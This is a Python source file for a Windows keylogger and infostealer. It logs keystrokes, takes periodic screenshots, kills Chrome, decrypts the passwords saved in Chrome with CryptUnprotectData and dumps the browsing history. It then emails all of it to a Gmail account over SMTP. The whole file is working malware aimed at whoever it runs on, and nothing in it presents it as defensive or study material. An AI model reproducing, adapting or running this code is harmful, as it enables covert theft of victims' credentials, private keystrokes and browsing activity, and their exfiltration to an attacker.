import threading
import time
import os
import sqlite3
import win32crypt
import operator
from collections import OrderedDict
import smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pynput.keyboard import Key,Listener,Controller
keyboard=Controller()

From="sender@gmail.com"
To="receiver@gmail.com"
username="login_id@gmail.com"
password="password"

exitflag=0
time_lapse_bt_each_scrnshot=300 #5 minutes
time_lapse_bt_steal_password=86400 # 1 day
time_lapse_bt_steal_history=time_lapse_bt_steal_password
class screenshot_thread(threading.Thread):
    def __init__(self,threadID,name,counter):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.counter=counter
    def run(self):
        import pyautogui
        import time
        from time import strftime,gmtime
        i=strftime("%a%d%b%Y%H%m%S",gmtime())
        #os.chdir("./photo")
        while  not exitflag:
            scrn=pyautogui.screenshot()
            scrn.save('scr'+i+'.png')
            time.sleep(time_lapse_bt_each_scrnshot)
        return
    def endthread(self):
        return

class keylog_thread(threading.Thread):
    def __init__(self,threadID,name,counter):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.counter=counter
    def on_press(self,key):
        file=open('keylog.txt','a')
        file.write('{0}'.format(key))
        file.close()
        if exitflag==1:
            return false
        
    def on_release(self,key):
        file=open('keylog.txt','a')
        #file.write('{0} release\n'.format(key))
        file.close()
        #if key==Key.esc:
         #   return false

    def run(self):
        with Listener(on_press=self.on_press,on_release=None) as listener:
            listener.join()

    def endthread(self):
        return

class steal_password_thread(threading.Thread):
    def __init__(self,threadID,name,counter):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.counter=counter
    def run(self):
        os.system('TASKKILL /IM chrome.exe')
        data_path = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
        login_db=os.path.join(data_path,'Login Data')

        c=sqlite3.connect(login_db)
        cursor=c.cursor()
        select_query="select origin_url,username_value,password_value from logins"
        cursor.execute(select_query)

        logindata=cursor.fetchall()
        #os.chdir('./password')
        file=open('password_file.txt','a')

        credential ={}
        for url,username,pwd in logindata:
            pwd = win32crypt.CryptUnprotectData(pwd,None,None,None,0)
            credential[url]=(username,pwd[1])
            file.write(url)
            file.write("  ")
            file.write(username)
            file.write("  ")
            file.write(pwd[1].decode("UTF-8"))
            file.write("\n")
        file.close()
        time.sleep(time_lapse_bt_steal_password)
    def endthread(self):
        return

class steal_chrome_history(threading.Thread):
    def __init__(self,threadID,name,counter):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.counter=counter
    def run(self): 
        os.system('TASKKILL /IM chrome.exe')
        data_path = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
        files = os.listdir(data_path)

        history_db =os.path.join(data_path,'history')

        c=sqlite3.connect(history_db)
        cursor=c.cursor()
        select_query="SELECT urls.url,urls.visit_count FROM urls, visits WHERE urls.id = visits.url"
        cursor.execute(select_query)
        results=cursor.fetchall()
        #os.chdir('./history')
        fw=open('history.txt','w')
        for result in results:
            #print(result)
            fw.write(result[0])
            fw.write('\n')
        fw.close()
        time.sleep(time_lapse_bt_steal_history)

    def endthread(self):
        return

class send_mail(threading.Thread):
    def __init__(self,threadID,name,counter):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.counter=counter
    def run(self):
        msg=MIMEMultipart()
        msg['Subject']='keylogger'+time.ctime(time.time())
        msg['From']='dinyajatboy@gmail.com'
        msg['To']='dinyajatboy@gmail.com'
        currpath=os.curdir
        
        #attach screenshots
        #scrn_path='./photo'
        #os.chdir(scrn_path)
        filenames=os.listdir()
        for filename in filenames:
            if filename.endswith(".png"):
                screenshot=open(filename,'rb').read()
                image=MIMEImage(screenshot,name=filename)
                msg.attach(image)
        #attach password file
        #os.chdir(currpath)
        #os.chdir('./../password/')
        pass_file=open('password_file.txt','r')
        attachment=MIMEText(pass_file.read())
        attachment.add_header('Content-Disposition','attachment',filename='password_file.txt')
        msg.attach(attachment)

        # attach history file
        #os.chdir(currpath)
        #os.chdir('./../history')
        pass_file=open('history.txt','r')
        attachment=MIMEText(pass_file.read())
        attachment.add_header('Content-Disposition','attachment',filename='history.txt')
        msg.attach(attachment)
        text=MIMEText("keylogger")
        msg.attach(text)
        
        s=smtplib.SMTP('smtp.gmail.com')
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(username,password)
        s.sendmail(From,To,msg.as_string())
        s.quit()
        time.sleep(86400)

    def endthread(self):
        return

os.chdir("./password")
screenshot_t= screenshot_thread(1,"scrnshot",1)
keylog_t    = keylog_thread(2,"keylog",1)
password_t  = steal_password_thread(3,"pass",1)
history_t   = steal_chrome_history(4,"history",1)
mail_t      = send_mail(5,"mail",1)

screenshot_t.start()
time.sleep(5)
keylog_t.start()
time.sleep(5)
password_t.start()
time.sleep(5)
history_t.start()
time.sleep(15)
mail_t.start()
